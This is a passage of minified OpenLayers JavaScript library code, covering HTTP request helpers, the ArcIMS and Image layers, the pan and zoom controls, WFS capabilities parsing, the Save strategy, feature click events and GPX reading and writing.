b=OpenLayers.Util.extend(this.DEFAULT_CONFIG,{proxy:OpenLayers.ProxyHost});a=a||{};a.headers=a.headers||{};a=OpenLayers.Util.applyDefaults(a,b);a.headers=OpenLayers.Util.applyDefaults(a.headers,b.headers);var b=!1,c;for(c in a.headers)a.headers.hasOwnProperty(c)&&\"x-requested-with\"===c.toLowerCase()&&(b=!0);!1===b&&(a.headers[\"X-Requested-With\"]=\n\"XMLHttpRequest\");var d=new OpenLayers.Request.XMLHttpRequest,e=OpenLayers.Util.urlAppend(a.url,OpenLayers.Util.getParameterString(a.params||{})),e=OpenLayers.Request.makeSameOrigin(e,a.proxy);d.open(a.method,e,a.async,a.user,a.password);for(var f in a.headers)d.setRequestHeader(f,a.headers[f]);var g=this.events,h=this;d.onreadystatechange=function(){d.readyState==OpenLayers.Request.XMLHttpRequest.DONE&&!1!==g.triggerEvent(\"complete\",{request:d,config:a,requestUrl:e})&&h.runCallbacks({request:d,config:a,\nrequestUrl:e})};!1===a.async?d.send(a.data):window.setTimeout(function(){0!==d.readyState&&d.send(a.data)},0);return d},runCallbacks:function(a){var b=a.request,c=a.config,d=c.scope?OpenLayers.Function.bind(c.callback,c.scope):c.callback,e;c.success&&(e=c.scope?OpenLayers.Function.bind(c.success,c.scope):c.success);var f;c.failure&&(f=c.scope?OpenLayers.Function.bind(c.failure,c.scope):c.failure);\"file:\"==OpenLayers.Util.createUrlObject(c.url).protocol&&b.responseText&&(b.status=200);d(b);if(!b.status||\n200<=b.status&&300>b.status)this.events.triggerEvent(\"success\",a),e&&e(b);b.status&&(200>b.status||300<=b.status)&&(this.events.triggerEvent(\"failure\",a),f&&f(b))},GET:function(a){a=OpenLayers.Util.extend(a,{method:\"GET\"});return OpenLayers.Request.issue(a)},POST:function(a){a=OpenLayers.Util.extend(a,{method:\"POST\"});a.headers=a.headers?a.headers:{};\"CONTENT-TYPE\"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers[\"Content-Type\"]=\"application/xml\");return OpenLayers.Request.issue(a)},PUT:function(a){a=\nOpenLayers.Util.extend(a,{method:\"PUT\"});a.headers=a.headers?a.headers:{};\"CONTENT-TYPE\"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers[\"Content-Type\"]=\"application/xml\");return OpenLayers.Request.issue(a)},DELETE:function(a){a=OpenLayers.Util.extend(a,{method:\"DELETE\"});return OpenLayers.Request.issue(a)},HEAD:function(a){a=OpenLayers.Util.extend(a,{method:\"HEAD\"});return OpenLayers.Request.issue(a)},OPTIONS:function(a){a=OpenLayers.Util.extend(a,{method:\"OPTIONS\"});return OpenLayers.Request.issue(a)}});OpenLayers.Layer.ArcIMS=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{ClientVersion:\"9.2\",ServiceName:\"\"},featureCoordSys:\"4326\",filterCoordSys:\"4326\",layers:null,async:!0,name:\"ArcIMS\",isBaseLayer:!0,DEFAULT_OPTIONS:{tileSize:new OpenLayers.Size(512,512),featureCoordSys:\"4326\",filterCoordSys:\"4326\",layers:null,isBaseLayer:!0,async:!0,name:\"ArcIMS\"},initialize:function(a,b,c){this.tileSize=new OpenLayers.Size(512,512);this.params=OpenLayers.Util.applyDefaults({ServiceName:c.serviceName},\nthis.DEFAULT_PARAMS);this.options=OpenLayers.Util.applyDefaults(c,this.DEFAULT_OPTIONS);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,this.params,c]);this.transparent&&(this.isBaseLayer||(this.isBaseLayer=!1),\"image/jpeg\"==this.format&&(this.format=OpenLayers.Util.alphaHack()?\"image/gif\":\"image/png\"));null===this.options.layers&&(this.options.layers=[])},getURL:function(a){var b=\"\";a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,{requesttype:\"image\",\nenvelope:a.toArray(),tileSize:this.tileSize}));a=new OpenLayers.Request.POST({url:this.getFullRequestString(),data:a.write(),async:!1});null!=a&&(b=a.responseXML,b&&b.documentElement||(b=a.responseText),b=(new OpenLayers.Format.ArcXML).read(b),b=this.getUrlOrImage(b.image.output));return b},getURLasync:function(a,b,c){a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,{requesttype:\"image\",envelope:a.toArray(),tileSize:this.tileSize}));OpenLayers.Request.POST({url:this.getFullRequestString(),\nasync:!0,data:a.write(),callback:function(a){var e=a.responseXML;e&&e.documentElement||(e=a.responseText);a=(new OpenLayers.Format.ArcXML).read(e);b.call(c,this.getUrlOrImage(a.image.output))},scope:this})},getUrlOrImage:function(a){var b=\"\";a.url?b=a.url:a.data&&(b=\"data:image/\"+a.type+\";base64,\"+a.data);return b},setLayerQuery:function(a,b){for(var c=0;c<this.options.layers.length;c++)if(a==this.options.layers[c].id){this.options.layers[c].query=b;return}this.options.layers.push({id:a,visible:!0,\nquery:b})},getFeatureInfo:function(a,b,c){var d=c.buffer||1,e=c.callback||function(){},f=c.scope||window,g={};OpenLayers.Util.extend(g,this.options);g.requesttype=\"feature\";a instanceof OpenLayers.LonLat?(g.polygon=null,g.envelope=[a.lon-d,a.lat-d,a.lon+d,a.lat+d]):a instanceof OpenLayers.Geometry.Polygon&&(g.envelope=null,g.polygon=a);var h=new OpenLayers.Format.ArcXML(g);OpenLayers.Util.extend(h.request.get_feature,c);h.request.get_feature.layer=b.id;\"number\"==typeof b.query.accuracy?h.request.get_feature.query.accuracy=\nb.query.accuracy:(a=this.map.getCenter(),c=this.map.getViewPortPxFromLonLat(a),c.x++,c=this.map.getLonLatFromPixel(c),h.request.get_feature.query.accuracy=c.lon-a.lon);h.request.get_feature.query.where=b.query.where;h.request.get_feature.query.spatialfilter.relation=\"area_intersection\";OpenLayers.Request.POST({url:this.getFullRequestString({CustomService:\"Query\"}),data:h.write(),callback:function(a){a=h.parseResponse(a.responseText);h.iserror()?e.call(f,null):e.call(f,a.features)}})},clone:function(a){null==\na&&(a=new OpenLayers.Layer.ArcIMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},CLASS_NAME:\"OpenLayers.Layer.ArcIMS\"});OpenLayers.Control.PanZoom=OpenLayers.Class(OpenLayers.Control,{slideFactor:50,slideRatio:null,buttons:null,position:null,initialize:function(a){this.position=new OpenLayers.Pixel(OpenLayers.Control.PanZoom.X,OpenLayers.Control.PanZoom.Y);OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.map&&this.map.events.unregister(\"buttonclick\",this,this.onButtonClick);this.removeButtons();this.position=this.buttons=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)},\nsetMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.register(\"buttonclick\",this,this.onButtonClick)},draw:function(a){OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position;this.buttons=[];var b={w:18,h:18},c=new OpenLayers.Pixel(a.x+b.w/2,a.y);this._addButton(\"panup\",\"north-mini.png\",c,b);a.y=c.y+b.h;this._addButton(\"panleft\",\"west-mini.png\",a,b);this._addButton(\"panright\",\"east-mini.png\",a.add(b.w,0),b);this._addButton(\"pandown\",\"south-mini.png\",\nc.add(0,2*b.h),b);this._addButton(\"zoomin\",\"zoom-plus-mini.png\",c.add(0,3*b.h+5),b);this._addButton(\"zoomworld\",\"zoom-world-mini.png\",c.add(0,4*b.h+5),b);this._addButton(\"zoomout\",\"zoom-minus-mini.png\",c.add(0,5*b.h+5),b);return this.div},_addButton:function(a,b,c,d){b=OpenLayers.Util.getImageLocation(b);c=OpenLayers.Util.createAlphaImageDiv(this.id+\"_\"+a,c,d,b,\"absolute\");c.style.cursor=\"pointer\";this.div.appendChild(c);c.action=a;c.className=\"olButton\";this.buttons.push(c);return c},_removeButton:function(a){this.div.removeChild(a);\nOpenLayers.Util.removeItem(this.buttons,a)},removeButtons:function(){for(var a=this.buttons.length-1;0<=a;--a)this._removeButton(this.buttons[a])},onButtonClick:function(a){switch(a.buttonElement.action){case \"panup\":this.map.pan(0,-this.getSlideFactor(\"h\"));break;case \"pandown\":this.map.pan(0,this.getSlideFactor(\"h\"));break;case \"panleft\":this.map.pan(-this.getSlideFactor(\"w\"),0);break;case \"panright\":this.map.pan(this.getSlideFactor(\"w\"),0);break;case \"zoomin\":this.map.zoomIn();break;case \"zoomout\":this.map.zoomOut();\nbreak;case \"zoomworld\":this.map.zoomToMaxExtent()}},getSlideFactor:function(a){return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor},CLASS_NAME:\"OpenLayers.Control.PanZoom\"});OpenLayers.Control.PanZoom.X=4;OpenLayers.Control.PanZoom.Y=4;OpenLayers.Control.PanZoomBar=OpenLayers.Class(OpenLayers.Control.PanZoom,{zoomStopWidth:18,zoomStopHeight:11,slider:null,sliderEvents:null,zoombarDiv:null,zoomWorldIcon:!1,panIcons:!0,forceFixedZoomLevel:!1,mouseDragStart:null,deltaY:null,zoomStart:null,destroy:function(){this._removeZoomBar();this.map.events.un({changebaselayer:this.redraw,updatesize:this.redraw,scope:this});OpenLayers.Control.PanZoom.prototype.destroy.apply(this,arguments);delete this.mouseDragStart;delete this.zoomStart},setMap:function(a){OpenLayers.Control.PanZoom.prototype.setMap.apply(this,\narguments);this.map.events.on({changebaselayer:this.redraw,updatesize:this.redraw,scope:this})},redraw:function(){null!=this.div&&(this.removeButtons(),this._removeZoomBar());this.draw()},draw:function(a){OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position.clone();this.buttons=[];var b={w:18,h:18};if(this.panIcons){var c=new OpenLayers.Pixel(a.x+b.w/2,a.y),d=b.w;this.zoomWorldIcon&&(c=new OpenLayers.Pixel(a.x+b.w,a.y));this._addButton(\"panup\",\"north-mini.png\",c,b);a.y=c.y+b.h;\nthis._addButton(\"panleft\",\"west-mini.png\",a,b);this.zoomWorldIcon&&(this._addButton(\"zoomworld\",\"zoom-world-mini.png\",a.add(b.w,0),b),d*=2);this._addButton(\"panright\",\"east-mini.png\",a.add(d,0),b);this._addButton(\"pandown\",\"south-mini.png\",c.add(0,2*b.h),b);this._addButton(\"zoomin\",\"zoom-plus-mini.png\",c.add(0,3*b.h+5),b);c=this._addZoomBar(c.add(0,4*b.h+5));this._addButton(\"zoomout\",\"zoom-minus-mini.png\",c,b)}else this._addButton(\"zoomin\",\"zoom-plus-mini.png\",a,b),c=this._addZoomBar(a.add(0,b.h)),\nthis._addButton(\"zoomout\",\"zoom-minus-mini.png\",c,b),this.zoomWorldIcon&&(c=c.add(0,b.h+3),this._addButton(\"zoomworld\",\"zoom-world-mini.png\",c,b));return this.div},_addZoomBar:function(a){var b=OpenLayers.Util.getImageLocation(\"slider.png\"),c=this.id+\"_\"+this.map.id,d=this.map.getMinZoom(),e=this.map.getNumZoomLevels()-1-this.map.getZoom(),e=OpenLayers.Util.createAlphaImageDiv(c,a.add(-1,e*this.zoomStopHeight),{w:20,h:9},b,\"absolute\");e.style.cursor=\"move\";this.slider=e;this.sliderEvents=new OpenLayers.Events(this,\ne,null,!0,{includeXY:!0});this.sliderEvents.on({touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp,mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp});var f={w:this.zoomStopWidth,h:this.zoomStopHeight*(this.map.getNumZoomLevels()-d)},b=OpenLayers.Util.getImageLocation(\"zoombar.png\"),c=null;OpenLayers.Util.alphaHack()?(c=this.id+\"_\"+this.map.id,c=OpenLayers.Util.createAlphaImageDiv(c,a,{w:f.w,h:this.zoomStopHeight},b,\"absolute\",null,\"crop\"),c.style.height=\nf.h+\"px\"):c=OpenLayers.Util.createDiv(\"OpenLayers_Control_PanZoomBar_Zoombar\"+this.map.id,a,f,b);c.style.cursor=\"pointer\";c.className=\"olButton\";this.zoombarDiv=c;this.div.appendChild(c);this.startTop=parseInt(c.style.top);this.div.appendChild(e);this.map.events.register(\"zoomend\",this,this.moveZoomBar);return a=a.add(0,this.zoomStopHeight*(this.map.getNumZoomLevels()-d))},_removeZoomBar:function(){this.sliderEvents.un({touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp,\nmousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp});this.sliderEvents.destroy();this.div.removeChild(this.zoombarDiv);this.zoombarDiv=null;this.div.removeChild(this.slider);this.slider=null;this.map.events.unregister(\"zoomend\",this,this.moveZoomBar)},onButtonClick:function(a){OpenLayers.Control.PanZoom.prototype.onButtonClick.apply(this,arguments);if(a.buttonElement===this.zoombarDiv){var b=a.buttonXY.y/this.zoomStopHeight;if(this.forceFixedZoomLevel||!this.map.fractionalZoom)b=\nMath.floor(b);b=this.map.getNumZoomLevels()-1-b;b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1);this.map.zoomTo(b)}},passEventToSlider:function(a){this.sliderEvents.handleBrowserEvent(a)},zoomBarDown:function(a){if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.map.events.on({touchmove:this.passEventToSlider,mousemove:this.passEventToSlider,mouseup:this.passEventToSlider,scope:this}),this.mouseDragStart=a.xy.clone(),this.zoomStart=a.xy.clone(),this.div.style.cursor=\n\"move\",this.zoombarDiv.offsets=null,OpenLayers.Event.stop(a)},zoomBarDrag:function(a){if(null!=this.mouseDragStart){var b=this.mouseDragStart.y-a.xy.y,c=OpenLayers.Util.pagePosition(this.zoombarDiv);0<a.clientY-c[1]&&a.clientY-c[1]<parseInt(this.zoombarDiv.style.height)-2&&(b=parseInt(this.slider.style.top)-b,this.slider.style.top=b+\"px\",this.mouseDragStart=a.xy.clone());this.deltaY=this.zoomStart.y-a.xy.y;OpenLayers.Event.stop(a)}},zoomBarUp:function(a){if((OpenLayers.Event.isLeftClick(a)||\"touchend\"===\na.type)&&this.mouseDragStart){this.div.style.cursor=\"\";this.map.events.un({touchmove:this.passEventToSlider,mouseup:this.passEventToSlider,mousemove:this.passEventToSlider,scope:this});var b=this.map.zoom;!this.forceFixedZoomLevel&&this.map.fractionalZoom?(b+=this.deltaY/this.zoomStopHeight,b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1)):(b+=this.deltaY/this.zoomStopHeight,b=Math.max(Math.round(b),0));this.map.zoomTo(b);this.zoomStart=this.mouseDragStart=null;this.deltaY=0;OpenLayers.Event.stop(a)}},\nmoveZoomBar:function(){var a=(this.map.getNumZoomLevels()-1-this.map.getZoom())*this.zoomStopHeight+this.startTop+1;this.slider.style.top=a+\"px\"},CLASS_NAME:\"OpenLayers.Control.PanZoomBar\"});OpenLayers.Format.WFSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.1.0\",CLASS_NAME:\"OpenLayers.Format.WFSCapabilities\"});OpenLayers.Format.WFSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{wfs:\"http://www.opengis.net/wfs\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\",ows:\"http://www.opengis.net/ows\"},errorProperty:\"featureTypeList\",defaultPrefix:\"wfs\",read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{wfs:{WFS_Capabilities:function(a,\nb){this.readChildNodes(a,b)},FeatureTypeList:function(a,b){b.featureTypeList={featureTypes:[]};this.readChildNodes(a,b.featureTypeList)},FeatureType:function(a,b){var c={};this.readChildNodes(a,c);b.featureTypes.push(c)},Name:function(a,b){var c=this.getChildValue(a);c&&(c=c.split(\":\"),b.name=c.pop(),0<c.length&&(b.featureNS=this.lookupNamespaceURI(a,c[0])))},Title:function(a,b){var c=this.getChildValue(a);c&&(b.title=c)},Abstract:function(a,b){var c=this.getChildValue(a);c&&(b[\"abstract\"]=c)}}},\nCLASS_NAME:\"OpenLayers.Format.WFSCapabilities.v1\"});OpenLayers.Format.WFSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,{regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},readers:{wfs:OpenLayers.Util.applyDefaults({DefaultSRS:function(a,b){var c=this.getChildValue(a);c&&(b.srs=c)}},OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs),ows:OpenLayers.Format.OWSCommon.v1.prototype.readers.ows},CLASS_NAME:\"OpenLayers.Format.WFSCapabilities.v1_1_0\"});OpenLayers.Layer.Image=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!0,url:null,extent:null,size:null,tile:null,aspectRatio:null,initialize:function(a,b,c,d,e){this.url=b;this.maxExtent=this.extent=c;this.size=d;OpenLayers.Layer.prototype.initialize.apply(this,[a,e]);this.aspectRatio=this.extent.getHeight()/this.size.h/(this.extent.getWidth()/this.size.w)},destroy:function(){this.tile&&(this.removeTileMonitoringHooks(this.tile),this.tile.destroy(),this.tile=null);OpenLayers.Layer.prototype.destroy.apply(this,\narguments)},clone:function(a){null==a&&(a=new OpenLayers.Layer.Image(this.name,this.url,this.extent,this.size,this.getOptions()));return a=OpenLayers.Layer.prototype.clone.apply(this,[a])},setMap:function(a){null==this.options.maxResolution&&(this.options.maxResolution=this.aspectRatio*this.extent.getWidth()/this.size.w);OpenLayers.Layer.prototype.setMap.apply(this,arguments)},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=null==this.tile;if(b||d){this.setTileSize();\nvar e=this.map.getLayerPxFromLonLat({lon:this.extent.left,lat:this.extent.top});d?(this.tile=new OpenLayers.Tile.Image(this,e,this.extent,null,this.tileSize),this.addTileMonitoringHooks(this.tile)):(this.tile.size=this.tileSize.clone(),this.tile.position=e.clone());this.tile.draw()}},setTileSize:function(){var a=this.extent.getWidth()/this.map.getResolution(),b=this.extent.getHeight()/this.map.getResolution();this.tileSize=new OpenLayers.Size(a,b)},addTileMonitoringHooks:function(a){a.onLoadStart=\nfunction(){this.events.triggerEvent(\"loadstart\")};a.events.register(\"loadstart\",this,a.onLoadStart);a.onLoadEnd=function(){this.events.triggerEvent(\"loadend\")};a.events.register(\"loadend\",this,a.onLoadEnd);a.events.register(\"unload\",this,a.onLoadEnd)},removeTileMonitoringHooks:function(a){a.unload();a.events.un({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,scope:this})},setUrl:function(a){this.url=a;this.tile.draw()},getURL:function(a){return this.url},CLASS_NAME:\"OpenLayers.Layer.Image\"});OpenLayers.Strategy=OpenLayers.Class({layer:null,options:null,active:null,autoActivate:!0,autoDestroy:!0,initialize:function(a){OpenLayers.Util.extend(this,a);this.options=a;this.active=!1},destroy:function(){this.deactivate();this.options=this.layer=null},setLayer:function(a){this.layer=a},activate:function(){return this.active?!1:this.active=!0},deactivate:function(){return this.active?(this.active=!1,!0):!1},CLASS_NAME:\"OpenLayers.Strategy\"});OpenLayers.Strategy.Save=OpenLayers.Class(OpenLayers.Strategy,{events:null,auto:!1,timer:null,initialize:function(a){OpenLayers.Strategy.prototype.initialize.apply(this,[a]);this.events=new OpenLayers.Events(this)},activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a&&this.auto)if(\"number\"===typeof this.auto)this.timer=window.setInterval(OpenLayers.Function.bind(this.save,this),1E3*this.auto);else this.layer.events.on({featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave,\nscope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&&this.auto&&(\"number\"===typeof this.auto?window.clearInterval(this.timer):this.layer.events.un({featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave,scope:this}));return a},triggerSave:function(a){var b=a.feature;b.state!==OpenLayers.State.INSERT&&b.state!==OpenLayers.State.UPDATE&&b.state!==OpenLayers.State.DELETE||this.save([a.feature])},save:function(a){a||(a=this.layer.features);\nthis.events.triggerEvent(\"start\",{features:a});var b=this.layer.projection,c=this.layer.map.getProjectionObject();if(!c.equals(b)){for(var d=a.length,e=Array(d),f,g,h=0;h<d;++h)f=a[h],g=f.clone(),g.fid=f.fid,g.state=f.state,f.url&&(g.url=f.url),g._original=f,g.geometry.transform(c,b),e[h]=g;a=e}this.layer.protocol.commit(a,{callback:this.onCommit,scope:this})},onCommit:function(a){var b={response:a};if(a.success()){for(var c=a.reqFeatures,d,e=[],f=a.insertIds||[],g=0,h=0,k=c.length;h<k;++h)if(d=c[h],\nd=d._original||d,a=d.state)a==OpenLayers.State.DELETE?e.push(d):a==OpenLayers.State.INSERT&&(d.fid=f[g],++g),d.state=null;0<e.length&&this.layer.destroyFeatures(e);this.events.triggerEvent(\"success\",b)}else this.events.triggerEvent(\"fail\",b)},CLASS_NAME:\"OpenLayers.Strategy.Save\"});OpenLayers.Events.featureclick=OpenLayers.Class({cache:null,map:null,provides:[\"featureclick\",\"nofeatureclick\",\"featureover\",\"featureout\"],initialize:function(a){this.target=a;if(a.object instanceof OpenLayers.Map)this.setMap(a.object);else if(a.object instanceof OpenLayers.Layer.Vector)a.object.map?this.setMap(a.object.map):a.object.events.register(\"added\",this,function(b){this.setMap(a.object.map)});else throw\"Listeners for '\"+this.provides.join(\"', '\")+\"' events can only be registered for OpenLayers.Layer.Vector or OpenLayers.Map instances\";\nfor(var b=this.provides.length-1;0<=b;--b)a.extensions[this.provides[b]]=!0},setMap:function(a){this.map=a;this.cache={};a.events.register(\"mousedown\",this,this.start,{extension:!0});a.events.register(\"mouseup\",this,this.onClick,{extension:!0});a.events.register(\"touchstart\",this,this.start,{extension:!0});a.events.register(\"touchmove\",this,this.cancel,{extension:!0});a.events.register(\"touchend\",this,this.onClick,{extension:!0});a.events.register(\"mousemove\",this,this.onMousemove,{extension:!0})},\nstart:function(a){this.startEvt=a},cancel:function(a){delete this.startEvt},onClick:function(a){if(this.startEvt&&(\"touchend\"===a.type||OpenLayers.Event.isLeftClick(a))){a=this.getFeatures(this.startEvt);delete this.startEvt;for(var b,c,d={},e=0,f=a.length;e<f&&(b=a[e],c=b.layer,d[c.id]=!0,b=this.triggerEvent(\"featureclick\",{feature:b}),!1!==b);++e);e=0;for(f=this.map.layers.length;e<f;++e)c=this.map.layers[e],c instanceof OpenLayers.Layer.Vector&&!d[c.id]&&this.triggerEvent(\"nofeatureclick\",{layer:c})}},\nonMousemove:function(a){delete this.startEvt;var b=this.getFeatures(a),c={};a=[];for(var d,e=0,f=b.length;e<f;++e)d=b[e],c[d.id]=d,this.cache[d.id]||a.push(d);var b=[],g;for(g in this.cache)d=this.cache[g],d.layer&&d.layer.map?c[d.id]||b.push(d):delete this.cache[g];e=0;for(f=a.length;e<f&&(d=a[e],this.cache[d.id]=d,g=this.triggerEvent(\"featureover\",{feature:d}),!1!==g);++e);e=0;for(f=b.length;e<f&&(d=b[e],delete this.cache[d.id],g=this.triggerEvent(\"featureout\",{feature:d}),!1!==g);++e);},triggerEvent:function(a,\nb){var c=b.feature?b.feature.layer:b.layer,d=this.target.object;if(d instanceof OpenLayers.Map||d===c)return this.target.triggerEvent(a,b)},getFeatures:function(a){var b=a.clientX,c=a.clientY,d=[],e=[],f=[],g,h,k,l;for(l=this.map.layers.length-1;0<=l;--l)if(g=this.map.layers[l],\"none\"!==g.div.style.display)if(g.renderer instanceof OpenLayers.Renderer.Elements){if(g instanceof OpenLayers.Layer.Vector)for(h=document.elementFromPoint(b,c);h&&h._featureId;)(k=g.getFeatureById(h._featureId))?(d.push(k),\nh.style.display=\"none\",e.push(h),h=document.elementFromPoint(b,c)):h=!1;f.push(g);g.div.style.display=\"none\"}else g.renderer instanceof OpenLayers.Renderer.Canvas&&(k=g.renderer.getFeatureIdFromEvent(a))&&(d.push(k),f.push(g));l=0;for(a=e.length;l<a;++l)e[l].style.display=\"\";for(l=f.length-1;0<=l;--l)f[l].div.style.display=\"block\";return d},destroy:function(){for(var a=this.provides.length-1;0<=a;--a)delete this.target.extensions[this.provides[a]];this.map.events.un({mousemove:this.onMousemove,mousedown:this.start,\nmouseup:this.onClick,touchstart:this.start,touchmove:this.cancel,touchend:this.onClick,scope:this});delete this.cache;delete this.map;delete this.target}});OpenLayers.Events.nofeatureclick=OpenLayers.Events.featureclick;OpenLayers.Events.featureover=OpenLayers.Events.featureclick;OpenLayers.Events.featureout=OpenLayers.Events.featureclick;OpenLayers.Format.GPX=OpenLayers.Class(OpenLayers.Format.XML,{defaultDesc:\"No description available\",extractWaypoints:!0,extractTracks:!0,extractRoutes:!0,extractAttributes:!0,namespaces:{gpx:\"http://www.topografix.com/GPX/1/1\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},schemaLocation:\"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd\",creator:\"OpenLayers\",initialize:function(a){this.externalProjection=new OpenLayers.Projection(\"EPSG:4326\");OpenLayers.Format.XML.prototype.initialize.apply(this,\n[a])},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=[];if(this.extractTracks)for(var c=a.getElementsByTagName(\"trk\"),d=0,e=c.length;d<e;d++){var f={};this.extractAttributes&&(f=this.parseAttributes(c[d]));for(var g=this.getElementsByTagNameNS(c[d],c[d].namespaceURI,\"trkseg\"),h=0,k=g.length;h<k;h++){var l=this.extractSegment(g[h],\"trkpt\");b.push(new OpenLayers.Feature.Vector(l,f))}}if(this.extractRoutes)for(e=a.getElementsByTagName(\"rte\"),c=0,d=\ne.length;c<d;c++)f={},this.extractAttributes&&(f=this.parseAttributes(e[c])),g=this.extractSegment(e[c],\"rtept\"),b.push(new OpenLayers.Feature.Vector(g,f));if(this.extractWaypoints)for(a=a.getElementsByTagName(\"wpt\"),c=0,e=a.length;c<e;c++)f={},this.extractAttributes&&(f=this.parseAttributes(a[c])),d=new OpenLayers.Geometry.Point(a[c].getAttribute(\"lon\"),a[c].getAttribute(\"lat\")),b.push(new OpenLayers.Feature.Vector(d,f));if(this.internalProjection&&this.externalProjection)for(f=0,a=b.length;f<a;f++)b[f].geometry.transform(this.externalProjection,\nthis.internalProjection);return b},extractSegment:function(a,b){for(var c=this.getElementsByTagNameNS(a,a.namespaceURI,b),d=[],e=0,f=c.length;e<f;e++)d.push(new OpenLayers.Geometry.Point(c[e].getAttribute(\"lon\"),c[e].getAttribute(\"lat\")));return new OpenLayers.Geometry.LineString(d)},parseAttributes:function(a){var b={};a=a.firstChild;for(var c,d;a;)1==a.nodeType&&a.firstChild&&(c=a.firstChild,3==c.nodeType||4==c.nodeType)&&(d=a.prefix?a.nodeName.split(\":\")[1]:a.nodeName,\"trkseg\"!=d&&\"rtept\"!=d&&\n(b[d]=c.nodeValue)),a=a.nextSibling;return b},write:function(a,b){a=OpenLayers.Util.isArray(a)?a:[a];var c=this.createElementNS(this.namespaces.gpx,\"gpx\");c.setAttribute(\"version\",\"1.1\");c.setAttribute(\"creator\",this.creator);this.setAttributes(c,{\"xsi:schemaLocation\":this.schemaLocation});b&&\"object\"==typeof b&&c.appendChild(this.buildMetadataNode(b));for(var d=0,e=a.length;d<e;d++)c.appendChild(this.buildFeatureNode(a[d]));return OpenLayers.Format.XML.prototype.write.apply(this,[c])},buildMetadataNode:function(a){for(var b=\n[\"name\",\"desc\",\"author\"],c=this.createElementNS(this.namespaces.gpx,\"metadata\"),d=0;d<b.length;d++){var e=b[d];if(a[e]){var f=this.createElementNS(this.namespaces.gpx,e);f.appendChild(this.createTextNode(a[e]));c.appendChild(f)}}return c},buildFeatureNode:function(a){var b=a.geometry,b=b.clone();this.internalProjection&&this.externalProjection&&b.transform(this.internalProjection,this.externalProjection);if(\"OpenLayers.Geometry.Point\"==b.CLASS_NAME){var c=this.buildWptNode(b);this.appendAttributesNode(c,\na);return c}c=this.createElementNS(this.namespaces.gpx,\"trk\");this.appendAttributesNode(c,a);a=this.buildTrkSegNode(b);a=OpenLayers.Util.isArray(a)?a:[a];for(var b=0,d=a.length;b<d;b++)c.appendChild(a[b]);return c},buildTrkSegNode:function(a){var b,c,d,e;if(\"OpenLayers.Geometry.LineString\"==a.CLASS_NAME||\"OpenLayers.Geometry.LinearRing\"==a.CLASS_NAME){b=this.createElementNS(this.namespaces.gpx,\"trkseg\");c=0;for(d=a.components.length;c<d;c++)e=a.components[c],b.appendChild(this.buildTrkPtNode(e));\nreturn b}b=[];c=0;for(d=a.components.length;c<d;c++)b.push(this.buildTrkSegNode(a.components[c]));return b},buildTrkPtNode:function(a){var b=this.createElementNS(this.namespaces.gpx,\"trkpt\");b.setAttribute(\"lon\",a.x);b.setAttribute(\"lat\",a.y);return b},buildWptNode:function(a){var b=this.createElementNS(this.namespaces.gpx,\"wpt\");b.setAttribute(\"lon\",a.x);b.setAttribute(\"lat\",a.y);return b},appendAttributesNode:function(a,b){var c=this.createElementNS(this.namespaces.gpx,\"name\");c.appendChild(this.createTextNode(b.attributes.name||\nb.id));a.appendChild(c);c=this.createElementNS(this.namespaces.gpx,\"desc\");c.appendChild(this.createTextNode(b.attributes.description||this.defaultDesc));a.appendChild(c)},CLASS_NAME:\"OpenLayers.Format.GPX\"});OpenLayers.Format.WMSDescribeLayer=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.1.1\",CLASS_NAME:\"OpenLayers.Format.WMSDescribeLayer\"});OpenLayers.Format.WMSDescribeLayer.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSDescribeLayer,{initialize:function(a){OpenLayers.Format.WMSDescribeLayer.prototype.initialize.apply(this,[a])},read:function(a){\"string\"==typeof 